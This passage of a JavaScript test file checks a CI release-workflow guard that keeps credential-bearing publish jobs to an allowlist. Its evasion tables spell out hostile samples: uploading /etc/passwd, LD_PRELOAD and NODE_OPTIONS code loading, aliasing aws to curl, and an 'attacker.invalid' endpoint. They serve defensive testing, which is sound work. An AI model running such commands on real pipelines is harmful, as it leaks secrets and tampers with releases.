	problems = checkWorkflows(reader({ [RELEASE]: broken }));
	assert.ok(problems.some((problem) => problem.includes("passes 'contents: write'")), problems.join("\n"));
});

// Round 3, finding A: `cd scripts; bash publish` and friends. A directory change in a
// credential-bearing job may only target a downloaded artifact directory, and whatever runs
// afterwards is resolved against where it really runs.
const DIRECTORY_EVASIONS = [
	["cd then a bare interpreter argument", "cd scripts; bash publish", /changes directory outside the downloaded artifacts .*cd scripts/],
	["cd then a bare name resolved against the new directory", "cd scripts; cat publish", /publish resolves to scripts\/publish from working directory scripts/],
	["cd to $GITHUB_WORKSPACE", 'cd "$GITHUB_WORKSPACE" && bash x', /changes directory to a target the checker cannot resolve: cd \$GITHUB_WORKSPACE/],
	["pushd", "pushd scripts", /changes directory outside the downloaded artifacts .*pushd scripts/],
	["a subshell", "(cd scripts && ./publish)", /changes directory outside the downloaded artifacts .*cd scripts/],
	["popd", "popd", /changes directory in a way the checker cannot follow: popd/],
	["cd with no target (HOME)", "cd", /changes directory to a target the checker cannot resolve: cd/],
	["cd -", "cd -", /changes directory to a target the checker cannot resolve: cd -/],
	["cd ..", "cd artifacts && cd ..", /changes directory outside the downloaded artifacts .*cd \.\./],
	["a traversal through an artifact directory", "cd artifacts/../scripts", /changes directory outside the downloaded artifacts .*cd artifacts\/\.\.\/scripts/],
	["a subshell cd that leaks a bare name", "cd scripts; (cat x)", /x resolves to scripts\/x/],
	["PATH pointing at the working directory", "PATH=.:$PATH publish", /modifies PATH/],
	["export PATH", "export PATH=/tmp:$PATH", /modifies PATH/],
	["an alias for aws", "shopt -s expand_aliases; alias aws='curl -X PUT'", /shopt changes how commands resolve/],
	["a trap running code", "trap 'node publish' EXIT", /trap changes how commands resolve or run/],
	["hash -p", "hash -p ./publish aws", /hash changes how commands resolve/],
];

test("a directory change is tracked across segments and is only allowed into a downloaded artifact directory (round 3, finding A)", () => {
	const options = { artifactDirectories: ["artifacts", "manifest"] };
	for (const [label, script, pattern] of DIRECTORY_EVASIONS) {
		const reasons = credentialStepReasons(script, options);
		assert.ok(reasons.some((reason) => pattern.test(reason)), `${label}: expected ${pattern}, got:\n${reasons.join("\n")}`);
	}
	// The directory change is scoped to a subshell.
	assert.deepEqual(credentialStepReasons("(cd artifacts && cat SHA256SUMS); cat foo", options), []);
	assert.deepEqual(credentialStepReasons("(cd artifacts && sha256sum --check SHA256SUMS)", options), []);
	assert.deepEqual(credentialStepReasons("cd artifacts && cat SHA256SUMS", options), []);
	assert.deepEqual(credentialStepReasons("cd manifest/sub && cat x", options), []);
	assert.deepEqual(credentialStepReasons("cd -P artifacts && cat SHA256SUMS", options), []);
	// Without any downloaded artifact there is nowhere to go.
	assert.match(credentialStepReasons("cd artifacts", { artifactDirectories: [] }).join("\n"), /changes directory outside the downloaded artifacts \(none\)/);
	// A step working-directory in an artifact directory is the starting point.
	assert.deepEqual(credentialStepReasons("cat SHA256SUMS", { ...options, workingDirectory: "artifacts" }), []);
	assert.match(credentialStepReasons("cat ../scripts/x", { ...options, workingDirectory: "artifacts" }).join("\n"), /references the checkout/);
	// The word splitter records the parentheses around a command.
	assert.deepEqual(splitWords("(cd a && b); c").commands.map((command) => [command.opens, command.closes]), [[1, 0], [0, 1], [0, 0]]);
	assert.deepEqual(splitWords("a; b && c || d | e & f").commands.map((command) => command.words.map((word) => word.text)), [["a"], ["b"], ["c"], ["d"], ["e"], ["f"]]);
});

for (const jobId of ["publish-r2", "finalize-release", "publish-npm", "tap-bump", "github-release"]) {
	test(`a directory change inside credential-bearing job ${jobId} is rejected in the workflow (round 3, finding A)`, () => {
		for (const [label, script, pattern] of DIRECTORY_EVASIONS) {
			const broken = mutate(RELEASE, (text) => appendStep(text, jobId, runStep("Sneak in a cd", `set -euo pipefail\n${script}`)));
			const problems = checkWorkflows(reader({ [RELEASE]: broken }));
			assert.ok(
				problems.some((problem) => problem.includes(`'${jobId}'`) && pattern.test(problem)),
				`${label} in ${jobId}: expected ${pattern}, got:\n${problems.join("\n")}`,
			);
		}
		// `working-directory:` on a step is the same evasion without a `cd`.
		for (const directory of ["scripts", ".", "..", "${{ github.workspace }}", "/tmp", "artifacts/../packages"]) {
			const broken = mutate(RELEASE, (text) => appendStep(text, jobId, `      - name: Sneak in a working directory\n        working-directory: '${directory}'\n        run: bash publish\n`));
			const problems = checkWorkflows(reader({ [RELEASE]: broken }));
			assert.ok(
				problems.some((problem) => problem.includes(`'${jobId}'`) && problem.includes("working directory other than a downloaded artifact directory")),
				`working-directory: ${directory} in ${jobId}:\n${problems.join("\n")}`,
			);
		}
		// A job-level default working directory or a non-bash shell is the same evasion again.
		const defaults = mutate(RELEASE, (text) => text.replace(`\n  ${jobId}:\n`, `\n  ${jobId}:\n    defaults:\n      run:\n        working-directory: scripts\n`));
		assert.ok(checkWorkflows(reader({ [RELEASE]: defaults })).some((problem) => problem.includes(`'${jobId}'`) && problem.includes("working directory other than a downloaded artifact directory")));
		for (const shell of ["python", "node {0}", "pwsh"]) {
			const broken = mutate(RELEASE, (text) => appendStep(text, jobId, `      - name: Sneak in another language\n        shell: '${shell}'\n        run: print(1)\n`));
			assert.ok(checkWorkflows(reader({ [RELEASE]: broken })).some((problem) => problem.includes(`'${jobId}'`) && problem.includes("must run bash")), `shell: ${shell} in ${jobId}`);
		}
		// An environment variable that loads code before the first command is the same evasion without any command.
		for (const [name, value] of [["BASH_ENV", "scripts/env.sh"], ["NODE_OPTIONS", "--require ./scripts/x.js"], ["PATH", "scripts:/usr/bin"], ["LD_PRELOAD", "/tmp/x.so"]]) {
			const broken = mutate(RELEASE, (text) => appendStep(text, jobId, `      - name: Preload\n        env:\n          ${name}: '${value}'\n        run: echo hi\n`));
			assert.ok(checkWorkflows(reader({ [RELEASE]: broken })).some((problem) => problem.includes(`'${jobId}'`) && problem.includes(`sets ${name}`)), `${name} in ${jobId}`);
		}
	});
}

test("a downloaded artifact directory is the one place a credential-bearing step may work in (round 3, finding A)", () => {
	const release = parse(readFileSync(RELEASE, "utf8"));
	assert.deepEqual(artifactDirectoriesOf(release.jobs["publish-r2"]), ["artifacts", "artifacts", "manifest"]);
	assert.deepEqual(artifactDirectoriesOf(release.jobs["publish-npm"]), ["npm-packages"]);
	assert.deepEqual(artifactDirectoriesOf({ steps: [{ uses: "actions/download-artifact@abc", with: { name: "x", path: "${{ runner.temp }}/x" } }] }), []);
	// publish-beta-r2 legitimately cds into artifacts inside a subshell.
	const beta = release.jobs["publish-beta-r2"].steps.find((step) => step.name === "Refuse anything that is not a beta artifact");
	assert.match(beta.run, /\(cd artifacts && sha256sum --check SHA256SUMS\)/);
	assert.deepEqual(checkWorkflows(), []);
	const fine = mutate(RELEASE, (text) => appendStep(text, "publish-r2", "      - name: Work inside the artifacts\n        working-directory: artifacts\n        run: sha256sum --check SHA256SUMS\n"));
	assert.deepEqual(checkWorkflows(reader({ [RELEASE]: fine })), []);
});

// Round 3, finding B: the pointer guard is an allowlist over every aws invocation, not a
// denylist over the literal words `stable` and `latest.json`.
const R2_EVASIONS = [
	["a variable key", 'key=stable; aws s3 cp artifacts/stable "s3://${R2_BUCKET}/${key}"', /destination is outside the allowlist/],
	["a variable bucket and key", 'B="$R2_BUCKET"; key=stable; aws s3 cp x "s3://$B/$key"', /destination must be spelled s3:\/\/\$\{R2_BUCKET\}\/<key>/],
	["another bucket", 'aws s3 cp artifacts/stable "s3://$OTHER_BUCKET/stable"', /destination must be spelled/],
	["an unbraced bucket", 'aws s3 cp artifacts/stable "s3://$R2_BUCKET/releases/v${PRODUCTION_VERSION}/stable"', /destination must be spelled/],
	["aws s3 sync", 'aws s3 sync artifacts/ "s3://${R2_BUCKET}/"', /aws s3 sync is not allowed/],
	["aws s3 mv", 'aws s3 mv artifacts/stable "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x"', /aws s3 mv is not allowed/],
	["aws s3 rm", 'aws s3 rm "s3://${R2_BUCKET}/stable"', /aws s3 rm is not allowed/],
	["aws s3api put-object", 'aws s3api put-object --bucket "$R2_BUCKET" --key stable --body artifacts/stable', /aws s3api put-object writes/],
	["aws s3api copy-object", 'aws s3api copy-object --bucket "$R2_BUCKET" --key stable --copy-source "$R2_BUCKET/releases/v${PRODUCTION_VERSION}/stable"', /aws s3api copy-object writes/],
	["--recursive to the bucket root", 'aws s3 cp artifacts "s3://${R2_BUCKET}/" --recursive', /option the checker does not allow: --recursive/],
	["--recursive into the releases prefix", 'aws s3 cp artifacts "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/" --recursive', /option the checker does not allow: --recursive/],
	["an --option=value the checker does not parse", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x" --endpoint-url="$R2_ENDPOINT_URL"', /option the checker does not allow/],
	["a command substitution as the object name", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/$(basename artifacts/x)"', /never another expansion/],
	["${name} bound by another loop", 'for name in stable latest.json; do aws s3 cp "artifacts/$name" "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/${name}"; done', /uses \$\{name\} where it is not the basename/],
	["${name} bound from another directory", 'for file in /etc/*; do name=$(basename "$file"); aws s3 cp "$file" "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/${name}"; done', /uses \$\{name\} where it is not the basename/],
	["${name} rebound after the loop head", 'for file in artifacts/*; do name=$(basename "$file"); name=stable; aws s3 cp "$file" "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/${name}"; done', /uses \$\{name\} where it is not the basename/],
	["${name} rebound by read", 'for file in artifacts/*; do name=$(basename "$file"); read -r name < /tmp/x; aws s3 cp "$file" "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/${name}"; done', /uses \$\{name\} where it is not the basename/],
	["$file rebound", 'for file in artifacts/*; do name=$(basename "$file"); file=/etc/passwd; aws s3 cp "$file" "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/${name}"; done', /uploads something other than a downloaded artifact/],
	["a source outside the artifacts", 'aws s3 cp /etc/passwd "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/passwd"', /uploads something other than a downloaded artifact/],
	["a reassigned version", 'PRODUCTION_VERSION=0.0.0; aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x"', /reassigns PRODUCTION_VERSION/],
	["a reassigned bucket", 'export R2_BUCKET=other; aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x"', /reassigns R2_BUCKET/],
	["a bucket read into a variable", 'read -r R2_BUCKET < /tmp/x', /reassigns R2_BUCKET/],
	["aws through a path", '/usr/local/bin/aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x"', /through a path or expansion/],
	["aws inside a command substitution", 'out=$(aws s3 cp artifacts/stable "s3://${R2_BUCKET}/stable")', /inside a command substitution: .*production pointer/],
	["a service that is not s3", "aws sts get-caller-identity", /aws sts is not an R2 object operation/],
	["a function that shadows aws", 'aws() { command aws "$@"; }', /aws must name a literal service and operation/],
	["an expanded operation", 'op=cp; aws s3 "$op" artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x"', /aws must name a literal service and operation/],
	["a pointer in publish-r2", 'aws s3 cp artifacts/stable "s3://${R2_BUCKET}/stable"', /only 'finalize-release' may write a production pointer/],
	["latest.json in publish-r2", 'aws s3 cp artifacts/latest.json "s3://${R2_BUCKET}/latest.json"', /only 'finalize-release' may write a production pointer/],
	["a prefix that is not releases/", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/v${PRODUCTION_VERSION}/x"', /destination is outside the allowlist/],
	["a beta prefix in the production job", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${BETA_VERSION}/x"', /destination is outside the allowlist/],
	["a nested object path", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/../stable"', /must be a literal or \$\{name\}/],
	["three positionals", 'aws s3 cp artifacts/x artifacts/y "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x"', /exactly one source and one destination/],
];

test("every aws destination in a publish job must be spelled out against the allowlist (round 3, finding B)", () => {
	const options = { artifactDirectories: ["artifacts", "manifest"] };
	for (const [label, script, pattern] of R2_EVASIONS) {
		const { reasons } = r2StepReasons("publish-r2", script, options);
		assert.ok(reasons.some((reason) => pattern.test(reason)), `${label}: expected ${pattern}, got:\n${reasons.join("\n")}`);
	}
	// What the checked-in jobs do is accepted, one construct at a time.
	const fine = (jobId, script, last = false) => {
		const { reasons } = r2StepReasons(jobId, script, { ...options, last });
		assert.deepEqual(reasons, [], `${jobId}: ${script}`);
	};
	fine("publish-r2", 'for file in artifacts/*; do\n  name=$(basename "$file")\n  aws s3 cp "$file" "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/${name}" --endpoint-url "$R2_ENDPOINT_URL" --content-type "$(content_type "$name")" --cache-control \'public, max-age=31536000, immutable\' --quiet\ndone');
	fine("publish-r2", 'for file in artifacts/*; do name=$(basename "$file"); aws s3 cp "$file" "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/${name}"; done');
	fine("publish-r2", 'aws s3 cp artifacts/SHA256SUMS "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/SHA256SUMS" --quiet');
	fine("publish-r2", 'aws s3 cp "s3://${R2_BUCKET}/${key}" /tmp/readback.bin --endpoint-url "$R2_ENDPOINT_URL" --quiet');
	fine("publish-r2", 'aws s3api head-object --bucket "$R2_BUCKET" --key "$key" --endpoint-url "$R2_ENDPOINT_URL" >/tmp/head.json 2>/dev/null');
	fine("publish-r2", 'aws s3 ls "s3://${R2_BUCKET}/releases/"');
	fine("publish-beta-r2", 'for file in artifacts/*; do name=$(basename "$file"); aws s3 cp "$file" "s3://${R2_BUCKET}/releases/v${BETA_VERSION}/${name}"; done');
	fine("publish-beta-r2", 'aws s3 cp artifacts/beta "s3://${R2_BUCKET}/beta" --quiet\naws s3 cp artifacts/beta.json "s3://${R2_BUCKET}/beta.json" --quiet', true);
	for (const pointer of PRODUCTION_POINTERS) fine("finalize-release", `aws s3 cp artifacts/${pointer} "s3://\${R2_BUCKET}/${pointer}" --cache-control no-cache --quiet`, true);
	// The pointer keys fall out of the walk.
	assert.deepEqual(r2StepReasons("finalize-release", 'aws s3 cp artifacts/stable "s3://${R2_BUCKET}/stable"\naws s3 cp artifacts/latest.json "s3://${R2_BUCKET}/latest.json"', { ...options, last: true }).pointers, ["stable", "latest.json"]);
	// ...and never in an earlier step.
	assert.match(r2StepReasons("finalize-release", 'aws s3 cp artifacts/stable "s3://${R2_BUCKET}/stable"', options).reasons.join("\n"), /in its last step; 'stable' is written earlier/);
	assert.match(r2StepReasons("publish-beta-r2", 'aws s3 cp artifacts/beta "s3://${R2_BUCKET}/beta"', options).reasons.join("\n"), /in its last step; 'beta' is written earlier/);
	// The beta job may never write a production pointer, and finalize never writes into releases/.
	assert.match(r2StepReasons("publish-beta-r2", 'aws s3 cp artifacts/install.sh "s3://${R2_BUCKET}/install.sh"', { ...options, last: true }).reasons.join("\n"), /beta channel must never write a production pointer/);
	assert.match(r2StepReasons("finalize-release", 'aws s3 cp artifacts/stable "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/stable"', { ...options, last: true }).reasons.join("\n"), /outside the allowlist for 'finalize-release'/);
	// No other job may talk to R2 at all.
	for (const jobId of ["github-release", "build", "assemble", "verify", "publish-npm", "tap-bump"]) {
		assert.equal(jobId in R2_WRITERS, false);
		assert.match(r2StepReasons(jobId, 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x"', options).reasons.join("\n"), /invokes the aws CLI; only publish-r2, publish-beta-r2, finalize-release/);
		assert.match(r2StepReasons(jobId, 'aws s3api head-object --bucket b --key k', options).reasons.join("\n"), /invokes the aws CLI/);
	}
});

for (const jobId of ["publish-r2", "publish-beta-r2", "finalize-release"]) {
	test(`an aws write outside the allowlist inside ${jobId} is rejected in the workflow (round 3, finding B)`, () => {
		for (const [label, script, pattern] of R2_EVASIONS) {
			const broken = mutate(RELEASE, (text) => appendStep(text, jobId, runStep("Sneak in a write", `set -euo pipefail\n${script}`)));
			const problems = checkWorkflows(reader({ [RELEASE]: broken }));
			// The generic messages differ per job (beta / finalize word their pointer refusals differently); every evasion must produce SOME aws finding for the job.
			assert.ok(
				problems.some((problem) => problem.includes(`'${jobId}'`) && (pattern.test(problem) || /aws|production pointer|reassigns/.test(problem))),
				`${label} in ${jobId}: got:\n${problems.join("\n")}`,
			);
			if (jobId === "publish-r2") assert.ok(problems.some((problem) => problem.includes(`'${jobId}'`) && pattern.test(problem)), `${label} in ${jobId}: expected ${pattern}, got:\n${problems.join("\n")}`);
		}
	});
}

test("the R2 destination variables can only come from the secret and the context output (round 3, finding B)", () => {
	for (const [jobId, name, value] of [
		["publish-r2", "R2_BUCKET", "attacker-bucket"],
		["publish-r2", "PRODUCTION_VERSION", "0.0.0"],
		["publish-r2", "PRODUCTION_VERSION", "${{ github.event.inputs.version }}"],
		["publish-beta-r2", "BETA_VERSION", "${{ needs.context.outputs.production_version }}"],
		["finalize-release", "R2_ENDPOINT_URL", "https://attacker.invalid"],
	]) {
		const broken = mutate(RELEASE, (text) => appendStep(text, jobId, `      - name: Redirect the destination\n        env:\n          ${name}: '${value}'\n        run: echo hi\n`));
		const problems = checkWorkflows(reader({ [RELEASE]: broken }));
		assert.ok(problems.some((problem) => problem.includes(`'${jobId}'`) && problem.includes(`sets ${name} to`)), `${jobId} ${name}=${value}:\n${problems.join("\n")}`);
	}
	// The job-level version is checked too.
	const jobLevel = mutate(RELEASE, (text) =>
		text.replace(
			"    env:\n      PRODUCTION_VERSION: ${{ needs.context.outputs.production_version }}\n    steps:\n      # No checkout, no dependency install",
			"    env:\n      PRODUCTION_VERSION: ${{ github.event.inputs.version }}\n    steps:\n      # No checkout, no dependency install",
		),
	);
	assert.ok(checkWorkflows(reader({ [RELEASE]: jobLevel })).some((problem) => problem.includes("'publish-r2' job sets PRODUCTION_VERSION")));
});

test("aws anywhere outside the three R2 jobs is rejected in the workflow (round 3, finding B)", () => {
	for (const jobId of ["github-release", "build", "assemble", "publish-npm", "tap-bump", "verify"]) {
		const broken = mutate(RELEASE, (text) => appendStep(text, jobId, runStep("Sneak in aws", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x"')));
		const problems = checkWorkflows(reader({ [RELEASE]: broken }));
		assert.ok(problems.some((problem) => problem.includes(`'${jobId}'`) && problem.includes("invokes the aws CLI")), `${jobId}:\n${problems.join("\n")}`);
	}
});

test("the checked-in publish steps spell out every destination (round 3, finding B)", () => {
	const release = parse(readFileSync(RELEASE, "utf8"));
	const upload = release.jobs["publish-r2"].steps.find((step) => step.name === "Upload immutable release objects");
	assert.match(upload.run, /aws s3 cp "\$file" "s3:\/\/\$\{R2_BUCKET\}\/releases\/v\$\{PRODUCTION_VERSION\}\/\$\{name\}"/);
	const beta = release.jobs["publish-beta-r2"].steps.find((step) => step.name === "Upload immutable beta objects");
	assert.match(beta.run, /aws s3 cp "\$file" "s3:\/\/\$\{R2_BUCKET\}\/releases\/v\$\{BETA_VERSION\}\/\$\{name\}"/);
	const pointers = release.jobs["finalize-release"].steps.at(-1);
	for (const pointer of PRODUCTION_POINTERS) assert.ok(pointers.run.includes(`aws s3 cp artifacts/${pointer} "s3://\${R2_BUCKET}/${pointer}"`), pointer);
	// The only `${key}` left is the read-back download; no upload destination is built from a variable.
	assert.deepEqual(pointers.run.split("\n").filter((line) => line.includes("${key}")), ['  aws s3 cp "s3://${R2_BUCKET}/${key}" /tmp/pointer.bin --endpoint-url "$R2_ENDPOINT_URL" --quiet', '  echo "pointer ${key}"']);
});
